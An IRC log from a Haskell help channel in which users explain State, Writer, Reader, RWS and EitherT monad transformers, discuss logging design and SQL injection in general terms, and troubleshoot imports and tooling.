04:23:11 <supki> > runWriter (runStateT (do n <- get; tell "incrementing"; put (succ n))0 )
04:23:12 <lambdabot>   (((),1),"incrementing")
04:23:22 <mbrock> there are many advantages, but basically it's just a more precise way of expressing what the program does
04:24:37 <danilo2> mbrock: Ok I understand that it is more precise, but could you name any of these big advantages please?
04:24:47 <lingxiao> hey all, is it possible to write some function that sends `Monad m => m a -> forall r. m r` ?
04:24:47 <mbrock> e.g. "generateStatement :: Statement -> Writer LogEntry [Instruction]" is much more informative than "... :: Statement -> IO [Instruction]"
04:25:05 <supki> danilo2: you know that Writer just appends stuff to some Monoid, you don't know what IO () does at all
04:25:12 <supki> i.e. you cannot reason about IO
04:26:25 <mbrock> also, you can run the thing without unsafePerformIO :)
04:27:10 <lpaste> danilo2 pasted “StateT problem” at http://lpaste.net/92275
04:27:13 <mbrock> it's more composable, for example you could then implement a "log filter" completely outside of these functions
04:27:18 <danilo2> Ok! That makes sesne
04:27:20 <danilo2> thank you :)
04:27:29 <donri> and you can easily silence the logging, or redirect it elsewhere, whatever
04:28:06 <donri> danilo2: yeah my example there was wrong, see supki's version
04:28:14 <lpaste> danilo2 revised “StateT problem”: “No title” at http://lpaste.net/92275
04:28:25 <danilo2> Additional, could you look at this code: http://lpaste.net/92275 ? What I'm doing here wrong ?
04:29:02 <darthdeus> this is probably super specific question, but anyone here who used rails and then moved onto something like yesod? :P
04:30:49 <lingxiao> second darthdeus question
04:30:57 <lingxiao> darthdeus' question*
04:31:35 <donri> nah, flask to happstack ;)
04:31:39 <haasn> I've written a hello world in both rails and yesod
04:31:40 <haasn> does that count?
04:31:56 <mbrock> danilo2: keeping it pure also means that you can safely and easily parallelize your code generation :)
04:32:38 <darthdeus> :( booo
04:32:50 <darthdeus> i'd love to hear a comparison on producitvity :P
04:32:58 <darthdeus> because haskell people say they're productive
04:33:03 <darthdeus> but that's compared to c++ and stuff
04:33:56 <darthdeus> donri: flask is a kinda miniframework though :( what about django or stuff like that?
04:34:24 <Maior> darthdeus: {springmvc, some tapestry, some Wicket, flask, django} -> yesod
04:34:39 <donri> haskell is very productive in theory. in practice, it's a rabbit hole and before you know it you're reading papers on comonadic coalgebras instead of actually writing any code
04:34:42 <danilo2> mbrock: That makes a lot of sense :) Thank you :) Could you please look at this simple code example - I was trying to compile it but I'm getting a lot of errors:  http://lpaste.net/92275
04:34:46 <darthdeus> because i can see how doing a small API endpoint with complicated business logic would make sense, like i'm totally buying that argument, but is it also better for things that are kinda repetitive, almost duplicate ... like simple CRUD apps?
04:34:49 <darthdeus> Maior: say more
04:35:11 <Maior> darthdeus: "yes"
04:35:11 <darthdeus> donri: haha i can see myself doing that :P
04:35:17 <Maior> darthdeus: types are your friend
04:35:25 <Maior> as is a decent type system
04:35:48 <Maior> the process of writing tests for things a type system should be able to verify irritates me
04:35:50 <darthdeus> Maior: but if you were to build a prototype of an app, would you build it in yesod?
04:36:02 <Maior> darthdeus: now? no, because I suck at using Yesod
04:36:22 <Maior> darthdeus: actually, probably still yes, depending on other constraints
04:36:28 <donri> darthdeus: i've used django a bit, but i tend to prefer the library approach to coding
04:36:28 <Maior> depends on the prototype too
04:37:20 <donri> darthdeus: (even ditching flask for werkzeug at one point)
04:37:53 <darthdeus> well lemme give you an example ... i want to build myself a really dumb simple CRM, just for my own use, beacuse i don't like any of the existing ones ... and i can see myself spending a couple of hours in rails and having it working ... but when i look at haskell (from my noooooob point of view), it's more like "i would use it if i wanted to do it right, not fast"
04:38:17 <darthdeus> like if that makes sense
04:38:29 <Maior> darthdeus: familiarity is useful
04:38:37 <donri> darthdeus: i think that's mostly a matter of what you're experienced with
04:39:37 <darthdeus> cool, so what you guys are saying is that the "everything is really strict and super static" approach doesn't slow you down when you're building things
04:39:41 <darthdeus> that probably came out worng
04:39:44 <darthdeus> wrong*
04:39:49 <donri> darthdeus: i did use rails years ago and only found frustration, where anything interesting required going against the framework with solutions that felt like hacks.
04:40:08 <lpaste> danilo2 revised “StateT problem”: “No title” at http://lpaste.net/92275
04:40:25 <donri> darthdeus: actually haskell is notoriously non-strict... ;)
04:41:27 <Maior> darthdeus: note "strict" has a technical meaning
04:41:34 <darthdeus> i need to learn this shit more
04:41:42 <mbrock> haskell has a somewhat annoying tendency to encourage thought and care
04:41:51 <darthdeus> mbrock: haha
04:41:54 <donri> darthdeus: [strictness usually refers to evaluation models, but i know you meant "strongly typed"]
04:42:11 <danilo2> ]Could somebody help me with this example please? http://lpaste.net/92275
04:42:30 <donri> danilo2: as i said, see supki's version of that example
04:42:35 <darthdeus> well i'm kinda used to doing whatever i want in the world of ruby, and now the compiler even tells me to use (*) instead of (\a b -> a * b), which is like some voodoo dark magic to me
04:43:10 <donri> darthdeus: that's hlint not ghc though, and completely optional
04:43:32 <danilo2> donri: Oh I didnt see yours answer - thank you
04:46:29 <darthdeus> donri: yeah, but it's amazing that it can figure this out, at least for my dynamically oriented brain
04:47:01 <donri> darthdeus: in this case it's purely syntactical, types don't enter into it
05:00:00 <danilo2> Hmmm coudl somebody tell me what is the type of "test= do n <- get; tell "incrementing"; put (succ n)" in expression "runWriter (runStateT test 0 )"? I was thinking it is "Writer String (State Int ())", but its not
05:02:15 <donri> danilo2: that's using mtl which means Monad* type classes
05:02:30 <elliott> danilo2: StateT Int (Writer String) ()
05:02:38 <elliott> er.
05:02:41 <elliott> probably Integer, not Int.
05:02:59 <Vertue> Does anyone know how to unzip a file that has password protection in Haskell?
05:03:24 <danilo2> donri, elliott: Ah, of course! thank you!
05:03:33 <Vertue> Codec.Archive.LibZip seems to have some support but I can't figure out how it works
05:04:27 <danilo2> What monad transformer would you suggest If I would like to use State, Writer AND would like in some cases to stop computing values - something like "error" in IO monad does, or "break" in imperative languages. Is it possible?
05:04:50 <elliott> MaybeT/EitherT
05:05:44 <danilo2> elliott: Thank you! :)
05:05:53 <donri> or even ErrorT
05:06:50 <danilo2> donri: I think EitherT / MaybeT is better, becouse it is "more pure" - it gives resutls of Either or Maybe - which is beautifull :)
05:07:12 <donri> so does ErrorT
05:07:30 <danilo2> donri: Ok, so what are the adventages one over the other?
05:08:04 <danilo2> donri: Sorry for such simple questions, but todays answers opened my eyes on some really important concepts - thank you all for that :)
05:08:08 <donri> danilo2: EitherT is more general, but ErrorT gives you 'fail'
05:08:09 * elliott thinks the primary disadvantage of ErrorT is that it sucks and is terrible. :(
05:08:19 <mbrock> danilo2: check out RWST as well -- perhaps some of the stuff in your State could instead be used as a MonadReader :)
05:08:20 <ibotty> Vertue: does not seem to be implemented in libzip
05:08:28 <ibotty> there is support in bindings-libzip
05:08:45 <ibotty> i only used conduit-zip before and that doesn't have it either
05:09:16 <ibotty> i wouldn't want to use bindings-libzip...
05:09:19 <donri> elliott: why?
05:09:32 <ibotty> you might try to call out to unzip
05:09:41 <donri> elliott: i think people hate ErrorT because they think it's a failed EitherT, but it's a separate transformer IMO...
05:09:48 <ibotty> (if you are on unix, that is)
05:10:03 <Vertue> ibotty: I am, how do I call out to something from haskell?
05:10:16 <ibotty> system.process (or similar)
05:10:35 <Vertue> ibotty: Ok will look at that in hackage
05:10:41 <ibotty> http://www.haskell.org/ghc/docs/7.0.2/html/libraries/unix-2.4.2.0/index.html
05:10:50 <ibotty> but there might be something easier
05:10:53 <Vertue> ibotty: So basically no native support?
05:11:08 <danilo2> mbrock: If I understandf good RSW is something Writer Monad + State Monad?
05:11:12 <ibotty> i looked in the source, no
05:11:24 <ibotty> only in bindings-libzip. but that's too low level for me
05:11:37 <Vertue> yeah that looks scary
05:11:37 <ibotty> you might like to write a patch to libzip :D
05:11:54 <ibotty> i _guess_ it might not be that hard
05:11:56 <Vertue> i might want to get better at haskell first :D
05:12:28 <ibotty> when i was starting, i used all the unix tools i knew. just calling them from haskell instead of from shell
05:12:33 <ibotty> that worked as well :)
05:12:40 <Vertue> strange that there is so much encrypting support but nothing for encrypted zip
05:13:15 <donri> danilo2: RWST is just ReaderT r (WriterT w (StateT s m))
05:13:34 <elliott> donri: well, the Error class is just gross.
05:13:41 <elliott> as is fail.
05:13:53 <elliott> it's not worth failing pattern matches!
05:14:03 <danilo2> donri: Can I use RWS instead of RWST? (asking only to be sure) Maybe I would not neeed any further Monad to this stack.
05:14:27 <donri> elliott: yeah i wish we had fail in a separate class and do desugared smartly
05:15:07 <elliott> donri: and then, I would be ok with Error e => MonadFail (EitherT e).
05:15:11 <elliott> er. fix that. but you know what I mean/
05:15:19 <donri> danilo2: if you don't need further monads, the T-less versions are fine yes
05:15:20 <zomg> You know I was thinking the other day, the only reason there's SQL injection is because someone thought it was a good idea to write a string based interface for running SQL queries from code =)
05:15:48 <zomg> with a language like Haskell you could easily have a stronger typed interface for it without necessarily making it unwieldy to write simple queries
05:16:10 <opqdonut> and that's what HSQL (or what was it called) does
05:16:16 <zomg> Yeah
05:16:40 <zomg> Anyone see the Hacker News post where the guy was running a shell command from PHP with sudo to create a new user and didn't escape any of the args...
05:16:52 <ibotty> zomg: do you think so? it's not that easy to support every syntax (good) databases support
05:16:53 <zomg> wait sorry, Reddit, not HN
05:17:15 <danilo2> Ok, but Why we would like to combine Reader monad with State Monad? According to the documentation: "Using Reader monad [...] is often clearer and easier than using the Control.Monad.State.State monad."
05:17:46 <opqdonut> danilo2: for added safety. the reader part can only be modified in a more restricted way than the state part
05:17:46 <zomg> ibotty: well, you would need to separate being able to place parameters directly into the query. That would pretty much sort it, you could still allow writing the query itself in a string-like syntax
05:17:49 <ibotty> zomg: there are idiots everywhere. that's not the point. it's _much_ work to build a SQL-dsl.
05:18:09 <donri> danilo2: with RWST you get three channels, and you can use the channel that best reflect intended access to something
05:18:13 <elliott> zomg: you can write parameterised SQL queries as strings just fine.
05:18:21 <donri> danilo2: if you have something that you shouldn't be writing, put it in the reader channel
05:18:21 <ibotty> and what determines what's a query and what's a parameter?
05:18:41 <zomg> I know all that. The point was not to start arguing about how it would work
05:19:11 <zomg> Merely that by providing a different type of interface, it would be possible to reduce the likelihood of inexperienced coders mis-using it
05:19:31 <elliott> ok, but every database binding already has this. it doesn't really have much relation to the type system or whatever.
05:19:35 <ibotty> i like where esqueleto (or however it is written) is going. but i cannot express most things i might write in postgres in esqueleto yet.
05:19:39 <elliott> the problem is one of education, nowadays
05:19:52 * ibotty nods
05:19:58 <donri> well you *could* use types to enforce "safe concatenation"
05:21:09 <zomg> Yeah
05:21:42 <donri> but it would probably be more convenient to provide a safe dsl or quasi-quoter
05:22:36 <danilo2> donri: Ok thank you :)
05:23:48 <donri> danilo2: like, you could use State for logging but then that means you can rewrite history, which you might not want for logging
05:24:44 <danilo2> donri: I wanted to use Writer for logging, I still do not see where should I use Reader instead of State, but maybe this will clarify when I start using RWS :)
05:25:16 <adnap> > printf "%d %d %d" 2 3 4
05:25:17 <lambdabot>   Could not deduce (Text.Printf.PrintfType t)
05:25:17 <lambdabot>    arising from the ambiguity c...
05:25:38 <donri> danilo2: say you have some type of Config that you read at startup, but it should be fixated once read
05:27:27 <danilo2> donri: Ok I see it! Thank you :) Hmm thats funny - when you learn haskell - on the beginning you're reading the "learn haskell ..." book, then you have to learn the monads deeper. I do not know why, but all the people I know have hard time learning Monads until you grasp all the ideas.
05:27:32 <adnap> PrintfType is magic.
05:27:52 <danilo2> donri: thank you for all the clarifications :) Today is a great day for me - I' ve understand a lot :)
05:27:58 <zomg> danilo2: that's monads for you :P
05:28:03 <donri> \o/
05:28:36 <zomg> for some of us the existing monad material is too... abstract. I found it much easier to understand them when I started actually thinking of them in terms of how they behave as programming language constructs
05:30:19 <mbrock> the monad instances mostly encapsulate common purely functional patterns, and sometimes those patterns themselves can be pretty tricky to understand at first
05:31:09 <mbrock> that's why it's a great exercise to (1) write a little program that uses the "writer" pattern without using any monad stuff, and then (2) implement the Writer monad yourself
05:31:56 <haasn> I write code using the ‘reader’ pattern without using any monad stuff quite often ;)
05:32:43 <adnap> haasn: You mean, you write code using functions
05:32:49 <mbrock> sigfpe's text "You Could Have Invented Monads!" goes through this exercise with Writer, [a], and State: http://blog.sigfpe.com/2006/08/you-could-have-invented-monads-and.html
05:32:51 <haasn> adnap: exactly
05:33:01 <allsystemsarego> hi all, how do I list all functions in GHCi's scope at one point?
05:33:11 <mbrock> after doing some of this you've sort of earned your right to use the do notation ;)
05:33:13 <adnap> I think the Reader monad is dumb.
05:33:51 <haasn> adnap: ReaderT can be useful
05:33:51 <elliott> I don't.
05:34:02 <adnap> haasn: So I have heard.
05:34:04 <haasn> plain ‘Reader’, on its own, is a bit redundant though
05:34:12 <haasn> since there's a perfectly adequate instance ((->) r)
05:34:19 <elliott> (->) r is the reader monad too.
05:34:24 <adnap> Yes, exactly.
05:34:25 <elliott> but Reader looks nicer in transformer stacks.
05:34:29 <haasn> yes
05:34:33 <haasn> plus (->) r isn't a transformer
05:34:47 <adnap> I haven't written much code using transformers.
05:35:22 <adnap> Which transformers do you use that have Reader?
05:35:42 <mbrock> ReaderT is nice in transformer stacks that do some kind of evaluation with scopes
05:35:51 <haasn> ReaderT GlobalConfiguration ...
05:36:16 <adnap> Is that similar to using a where clause?
05:37:07 <zomg> yeah reader becomes pretty nice as soon as you need to carry around a bit more stuff that would be annoying to pass around to everything that needs it
05:37:16 <haasn> there's a practical example from XMonad
05:37:28 <haasn> newtype X a = X (ReaderT XConf (StateT XState IO) a)
05:37:43 <adnap> Yikes
05:37:47 <haasn> to encode wm-state-changing actions
05:41:04 <adnap> What is the difference between IORef and MVar? Is it that MVar blocks?
05:41:30 <aleator> adnap: MVar can also be empty
05:42:23 <akegalj> haasn: "User $:: Just ~> Just ~> id -- hehe"
05:42:43 <akegalj> haasn: i cant figure out why id must be here?
05:45:20 <haasn> short answer: because of the way pointless-fun operates; $:: f ~> y  means ‘y’ operates on the result, and ‘f’ operates on the input
05:45:47 <haasn> so in the case of a two-parameter function, that's $:: f ~> (g ~> y) which means that ‘g ~> y’ again operates on the result (in this case another function), and ‘f’ operates on the input
05:46:41 <Eduard_Munteanu> Is there any extension that makes imports override previous imports as a strategy to solve ambiguities?
05:47:07 <akegalj> haasn: ok... i think i got it
05:47:37 <Eduard_Munteanu> Everytime I write something in Haskell I swear I'm going to rewrite Prelude. :)
05:48:40 <nooodl> Eduard_Munteanu: that sounds like a dangerous extension. i'd probably just write "import Prelude hiding (...)" and defined the hidden functions myself?
05:48:51 <nooodl> *define
05:51:55 <Cale> Eduard_Munteanu: There *is* an extension to disambiguate the module based on type, but only for record fields.
05:53:39 <adnap> I am really enjoying http://chimera.labs.oreilly.com/books/1230000000929 It is as exciting as LYAH was
06:04:28 <shanse> yeah, it's a good read
06:07:42 <Ghoul_> there might be people in here using sublime text for haskell
06:07:53 <haasn> I've used sublime text for haskell in the past
06:07:59 <Ghoul_> It ships with messed up highlightinh
06:08:10 <Ghoul_> heres a better Haskell.tmLanguage which fixes all the glitches: https://gist.github.com/kvanberendonck/6377808
06:08:27 <Ghoul_> credits to various patches all over the internet, took a while to put together.
06:08:42 <haasn> not sure about highlighting, but I remember having to patch the popular linter plugin to support hlint
06:09:05 <Ghoul_> uh, quasi, comments, and other things ship broken
06:09:22 <Ghoul_> also module or import that aren't really module or import statements (ie: part of variable names) break highlighting in the entire file
06:14:33 <Eduard_Munteanu> How do I tell ghc to stop bugging me about "Empty record update of: emptyDef" ?
06:14:56 <Eduard_Munteanu> (it is what I want)
06:23:29 <Cale> Eduard_Munteanu: You could remove the braces. There might be a flag to turn that off though
06:29:55 <danilo2> Could somebody tell me why in haskell there is runEitherT (from Control.Monad.Trans.Either) but there is no runEither?
06:30:39 <Cale> What type would it have?
06:30:44 <Cale> :t either
06:30:45 <lambdabot> (a -> c) -> (b -> c) -> Either a b -> c
06:31:26 <Cale> :t runEitherT
06:31:27 <lambdabot>     Not in scope: `runEitherT'
06:31:27 <lambdabot>     Perhaps you meant `runWriterT' (imported from Control.Monad.Writer)
06:31:32 <Eduard_Munteanu> Cale: well, but then it's not a record update anymore... the thing is record updates change types ;)
06:31:44 <Cale> Eduard_Munteanu: oh, I see
06:32:25 <danilo2> runEitherT: http://hackage.haskell.org/packages/archive/either/3.4.1/doc/html/Control-Monad-Trans-Either.html
06:32:37 <danilo2> lambdabot: ^^
06:32:38 <Cale> danilo2: runEitherT :: EitherT e m a -> m (Either e a)
06:32:53 <Cale> So, if m = Identity, that would become:
06:33:04 <Cale> runEither :: Either e a -> Either e a
06:33:09 <Cale> essentially
06:33:42 <danilo2> Cale: so we do not need runEither since it automatically makes calls to Left and Right proper monad functions ... (I think so)
06:33:53 <Cale> monad functions?
06:34:34 <Cale> The fact that it happens to be a monad is somewhat beside the point here
06:34:57 <danilo2> Cale: Hmm wrong word: I mean such function works: test=do{Left "fail"; Right "ok"} - it results in Left "fail"
06:35:05 <Eduard_Munteanu> danilo2: run* functions are meant to extract values from various monadic computations.
06:35:37 <Cale> danilo2: That works because there is an instance Monad (Either e)
06:36:03 <danilo2> Ok so coudl somebody tell me how can I combine RWS with EitherT ? I want simply to be able to put "Left" in the "do block" and return a Left value AND current state AND the logs from Writer?
06:36:18 <Cale> You can't do that.
06:36:26 <danilo2> Cale: Why?
06:36:48 <Cale> If one of the statements of your do block is Left x for some x, then the do-block as a whole has type Either e a for some types e and a
06:36:59 <Cale> unconditionally
06:37:06 <Cale> Left isn't polymorphic in that way
06:37:10 <lpaste> danilo2 pasted “RWS + EitherT question” at http://lpaste.net/92280
06:37:28 <Cale> use left
06:37:30 <danilo2> Cale : I want to do something like this: http://lpaste.net/92280 - is it doable any way?
06:37:41 <Cale> left :: Monad m => e -> EitherT e m a
06:37:51 <Cale> which is equivalent to throwError
06:37:59 <Cale> There's also  right :: Monad m => a -> EitherT e m a
06:38:03 <Cale> which is equivalent to return
06:38:13 <danilo2> oh, I see- it is something i'm looking for (i think)
06:38:15 <Eduard_Munteanu> danilo2: then don't use Either as a monad, use it in your 'w' for the Writer.
06:38:34 <Cale> What are you using RWS for, btw?
06:38:35 <Eduard_Munteanu> Or do you want Left to abort too?
06:38:42 <danilo2> Eduard_Munteanu: Ok I'm trying it
06:38:58 <Cale> (I'm just curious, because it's not something which comes up all the time)
06:39:13 <danilo2> Cale: Im using it for generating code - I'm keeping some variables in the state (like current AST path or varmapping) , Writer for logging - errors warnings etc
06:39:21 <Eduard_Munteanu> I think he wants a return/exit.
06:39:37 <Cale> heh, you could use ContT for that ;)
06:39:43 <danilo2> Eduard_Munteanu: exactly - sometimes I want to break the code generation and exit with Left error
06:39:56 <danilo2> ContT? Ok i'll look into it :)
06:40:16 <Cale> callCC $ \ret -> do ... ; if ... then ret v else somethingElse; ...
06:40:34 <Eduard_Munteanu> danilo2: oh, Either is fine for that... so is ErrorT which you might also like.
06:40:54 <Cale> callCC gives you a way to create escapes somewhat like return/break do in say C.
06:41:07 <danilo2> Eduard_Munteanu: I think I'll stick with either + rws - I'm trying it right now :)
06:41:15 <Cale> (though it's more powerful because it *names* the continuation it gives you)
06:41:34 <danilo2> Cale: Thank you - could you tell a litlle more about why ContT would be better than EitherT in this casE?
06:41:41 <Cale> I'm not sure it would.
06:42:51 <Cale> But it's an option. To be honest, it can sometimes get a bit hard to reason about. It basically gives you all the worst control flow structures from imperative programming and then some.
06:43:25 <Eduard_Munteanu> ContT doesn't force you to distinguish errors from proper values.
06:44:09 <Cale> You can for instance, do this somewhat mindbending thing:
06:44:10 <Cale> getCC :: MonadCont m => m (m a)
06:44:11 <Cale> getCC = callCC (\c -> let x = c x in return x)
06:44:26 <lpaste> danilo2 pasted “EitherT + RWS” at http://lpaste.net/92281
06:44:40 <Cale> and then you can write something like   do loop <- getCC; liftIO (putStrLn "hello"); loop
06:44:47 <danilo2> Ok, coukld you tell me additional please what is the type of "test" here: http://lpaste.net/92281 ?
06:44:51 <Cale> and you'll have an infinite loop
06:45:27 <Cale> danilo2: You could ask GHC about that, no?
06:45:29 <danilo2> Cale: what you've shown is very interesting
06:45:32 <danilo2> Cale: thank you
06:46:18 <Eduard_Munteanu> :t left
06:46:19 <lambdabot> ArrowChoice a => a b c -> a (Either b d) (Either c d)
06:46:25 <Cale> test :: (MonadState m, MonadWriter m) => EitherT String m ()
06:46:29 <danilo2> Cale: Hmmm - I normally ask GHC  - by replacing the function typwe signature with something like ::Int and looking for errors
06:46:35 <Cale> errr
06:46:37 <Cale> derp
06:46:58 <danilo2> Cale: but now it gives me something strange like: EitherT [Char] m0 s0  -> (s0 -> EitherT [Char] m0 ()) -> EitherT [Char] m0 ()
06:46:59 <Cale> test :: (Enum a, MonadState a m, MonadWriter [String] m) => EitherT String m ()
06:47:07 <danilo2> Do you have better method of asking GHC about it ?
06:47:35 <Eduard_Munteanu> That looks like (>>=)'s type.
06:47:53 <Cale> danilo2: If it compiles, you can load it in ghci and type  :t test
06:48:34 <danilo2> still this function will have a lot broader definition than it should have I think
06:49:02 <danilo2> Cale : Thank you :)
06:49:09 <Cale> hah, either somehow depends on MonadRandom
06:51:30 <danilo2> Cale: But I understand, that using RSW + EitherT for code generation in compiler is fine? (I'm askign about the purity and overall awesomness ;) )
06:53:02 <Cale> danilo2: Well, it's pure, but you're in essence simulating an imperative machine.
06:53:55 <Cale> So the kinds of bugs you'll have to watch out for are similar to the bugs you might worry about in imperative code, but more restricted because the state on which you're acting and the effects which are possible are limited.
06:54:11 <danilo2> Cale: Hmm I have to somehow keep the varmaping between function calls (for example var "a" was created and it is binded to an identifier id 1) - so I think I would have to pass it somehow between functions and using RSW is more pure even in Haskell, isnt it?
06:54:45 <danilo2> Cale: additional I want to keep logging between pure functions, so the Writer is suitable for it I think
06:55:33 <Cale> danilo2: Often Reader is enough for variable bindings
06:55:38 <Cale> along with 'local'
06:55:40 <Cale> :t local
06:55:41 <lambdabot> MonadReader r m => (r -> r) -> m a -> m a
06:56:00 <Cale> This is like a locally scoped change to state
06:56:45 <danilo2> Cale: Ok :) I'll try to refactor that later when I;ll be sure I do not need anything more :) thank you very much for all the help! :)
06:58:05 <Cale> oh!
06:58:27 <Cale> danilo2: Sorry I didn't notice before, I had to recompile some basic packages because I just installed a new OS
06:58:48 <Cale> danilo2: But the reason your 'test' wasn't compiling before is the dreaded monomorphism restriction
06:59:08 <Cale> danilo2: If you add {-# LANGUAGE NoMonomorphismRestriction #-} to the top of the file, it'll build
06:59:09 <danilo2> Cale: Ok, I managed to see it :)
06:59:21 <danilo2> Cale: Yeah, I've added it already :)
06:59:45 <Cale> ghci> :t test
06:59:45 <Cale> test
06:59:45 <Cale>   :: (Enum s, MonadWriter [[Char]] m, MonadState s m) =>
06:59:45 <Cale>      EitherT [Char] m ()
06:59:52 <Cale> and that's the type ghci infers
07:00:15 <danilo2> Cale : oh, cool, I'll use it every time now!
07:01:31 <danilo2> Btw Dont you think that hsLogger is very limited? Its log function has signature ... -> IO(), when it could have "MonadWriter [LogEntry] m => Priority -> String -> String -> m()" - this will allow it to be used not only in IO Monad ?
07:03:43 <mbrock> you can implement that yourself on top of hslogger, and see the hslogger as just a unified interface to different logging backends (growl, syslog, etc)
07:04:50 <mbrock> so in your "inner" code you use a Writer of any type you want, and then in the "outer" code you translate the Writer's log entries into calls to hslogger
07:05:57 <danilo2> mbrock: I'm doing it riht now, but I think it should be implemented in this library. Btw could you advise me in which package should I put this genralised logger? It shoudl be something like MyPackage.Control.Log.Logger or MyPackage.System.Log.Logger or ... ?
07:06:12 <danilo2> mbrock: I'm asking about the convention /p urity of such genralized packages in Haskell
07:06:35 <donri> Control.Data.Monad.System.Logging.Log.Logger.Writer
07:07:31 <mbrock> I'd probably just go with MyPackage.Logging or something, for simplicity...
07:08:15 <danilo2> mbrock: and if you would like to keep the convention (and not the simplicity)?
07:08:29 <danilo2> mbrock: the convention of Haskell libraries in hackage
07:09:07 <Cale> danilo2: There isn't exactly a strict convention
07:09:25 <donri> danilo2: you should submit it upstream
07:09:31 <donri> it already depends on mtl anyway
07:09:33 <Cale> Except sometimes people add Control. or Data. to the start of the module path for no good reason whatsoever ;)
07:10:06 <danilo2> donri: If I'll write it in proper and bweautifull way - i'll do it :)
07:13:06 <deas> Hi. I just started looking at the State monad, and I am really confused by put and get functions. Could anybody explain how get works? It doesnt really take any argument, so how does it find the current state?
07:13:25 <donri> deas: it doesn't; >>= does
07:13:26 <elliott> it does take an argument, because State is a function under the hood.
07:13:52 <Kinnison> Approximately, State Foo Bar is :: Foo -> (Foo,Bar)
07:14:38 <dwcook> @type state
07:14:39 <lambdabot> MonadState s m => (s -> (a, s)) -> m a
07:14:45 <dwcook> Woop
07:14:47 <dwcook> @type runState
07:14:48 <lambdabot> State s a -> s -> (a, s)
07:14:53 <Cale> deas: Have you seen the implementation of the State monad?
07:14:54 <dwcook> That's one way to give it an argument
07:15:03 <donri> well get = state (\s -> (s,s)), so
07:15:17 <bscarlet> deas: donri's point is that the argument you're looking for is hidden by the syntactic sugar of "do" syntax, but in some sense it is there.
07:16:04 <deas> Ye, I see, get doesnt take arguments, but the value it produces does?
07:16:11 <Cale> deas: Internally, a value of type State s a is a function s -> (s,a) (or s -> (a,s) depending on arbitrary convention)
07:16:13 <elliott> what's the difference?
07:16:22 <donri> deas: "get" is a function wrapped in a newtype
07:16:40 <Cale> We could implement our own State monad like this:
07:16:43 <benj_> deas, yes, get produces an action which, when run, will accept the state and return it for the next action in the chain
07:16:49 <Cale> newtype State s a = S (s -> (s,a))
07:17:12 <Cale> Note that S :: (s -> (s,a)) -> State s a
07:17:18 <Cale> and we can go the other way:
07:17:25 <Cale> runState :: State s a -> s -> (s,a)
07:17:31 <Cale> runState (S f) s = f s
07:18:10 <Cale> The interpretation here is that the function s -> (s,a) is a function from the initial state to a final state and a result
07:18:49 <Cale> We can chain these things together in various ways, (>>=) being a central one.
07:19:14 <Cale> get :: State s s is supposed to be a computation which doesn't change the state, so the final state is the same as the initial one
07:19:23 <Cale> and it's supposed to result in the current value of the state
07:19:26 <deas> Okey, thanks... I need to go throught every State tutorial and then, maybe i will understand properly :D
07:19:31 <Cale> So   get = S (\s -> (s,s))
07:19:53 <Cale> I'd give you a more proper tutorial, but my hours are all screwy, and I'm just about to sleep
07:20:22 <mbrock> deas: you might try taking a little example of State use, and expanding the definitions of State, (>>=), return, get, and so on
07:20:24 <deas> Its fine, thanks... and good night
07:20:45 <mbrock> deas: you'll see how it all just boils down to normal functions
07:22:37 <donri> newtype State s a = State { runState :: s -> (a,s) }; get = State (\s -> (s,s)); runState get :: \s -> (s,s)  -- see how it actually is a function, just wrapped in a newtype
07:23:16 <donri> runState doesn't actually run anything, it just unwraps the newtype
07:23:52 <Cale> If we'd chosen another representation for the computations, it might look something like an interpreter though
07:24:16 <Cale> It's just, we're in a functional programming language, so we have this option to use a representation which makes runState trivial to write :)
07:27:21 <applicative> runState is $ for the state changing function
07:28:26 <mike-burns> My understanding of monoids is that they are things that can be appended; my understanding of `foldMap' is that it it works on monoids; and my understanding of `map' is that it can be defined in terms of `foldr', which can in turn be defined in terms of `foldMap'. So, `map' is a monoid?
07:28:42 <valyagolev> is there a way to `(Typeable b) => a -> Maybe b` ?
07:28:49 <donri> :t cast
07:28:50 <lambdabot> (Typeable a, Typeable b) => a -> Maybe b
07:28:53 <mauke> monoids are sets with an associative operation and a neutral element
07:29:03 <valyagolev> a is not (necessairy) typeable
07:29:10 <mauke> valyagolev: yes, const Nothing
07:29:13 <donri> :p
07:29:15 <applicative> > do {modify (+1); modify (+1); modify (+1)} `runState` 0
07:29:16 <lambdabot>   ((),3)
07:29:18 <valyagolev> :)))
07:29:43 <valyagolev> I want Nothing if it's not typeable, and Just type if it is
07:29:58 <valyagolev> hm. `a -> Maybe TypeRep`
07:30:00 <b2coutts> :t foldMap
07:30:01 <lambdabot> (Foldable t, Monoid m) => (a -> m) -> t a -> m
07:30:31 <poppingtonic> I'm reading Conrad Barski's .hs tutorial. In it, he imports Text.Regex, but Prelude kicks that out, saying it "can't find module Text.Regex". Is there something I'm missing?
07:30:43 <donri> valyagolev: there is no sensible way to do that, i don't think. but everything is Typeable in ghc HEAD IIUC
07:30:44 <b2coutts> mike-burns: I don't fully understand your question; types are monoids, map is a function
07:30:46 <valyagolev> this is impossible because of unboxing, yes?
07:30:49 <applicative> hm, where is this poppingtonic
07:31:18 <valyagolev> donri: I just want to get damn Show (a -> b)  to show me types
07:31:27 <mauke> poppingtonic: by "Prelude" do you mean ghci?
07:31:34 <donri> @hackage show does that, valyagolev
07:31:34 <lambdabot> http://hackage.haskell.org/package/show does that, valyagolev
07:31:35 <poppingtonic> mauke: yes.
07:31:57 <mike-burns> b2coutts: But is it possible to define `map' in terms of `foldMap'? This would require some sort of mapping monoid, I think, but I don't completely understand it.
07:32:01 <poppingtonic> applicative: http://www.lisperati.com/haskell/
07:32:03 <valyagolev> donri thanks a ton
07:32:15 <valyagolev> instance Typeable a => Show (IO a)
07:32:17 <valyagolev> duh
07:32:19 <applicative> type import Text.Regex , no, poppingtonic
07:32:19 <valyagolev> okay
07:32:49 <applicative> poppingtonic: i'm worried that page might be a little antique, but it might be okay
07:32:56 <valyagolev> it just means that I can't use to insert trace things it in most places where "a" is needed
07:34:00 <applicative> poppingtonic: i guess it looks okay; if something seem broken people here will immediately know the cause
07:34:06 <poppingtonic> applicative: nope, still barfs. I was a little afraid of that, btw. The page being behind the current version.
07:34:24 <applicative> what package is Text.Regex from , just a sec
07:34:31 <b2coutts> mike-burns: I think foldMap is just a more general map, which works on any Foldable datatype
07:34:36 <b2coutts> instead of only working on lists specifically
07:34:59 <bscarlet> :t foldMap
07:34:59 <lambdabot> (Foldable t, Monoid m) => (a -> m) -> t a -> m
07:35:01 <applicative> poppingtonic: if you do 'ghc-pkg find-module Text.Regex' you see if you have it
07:35:15 <applicative> if not, it's in the regex-compat library, it seems.
07:35:15 <b2coutts> er, wait, that's wrong
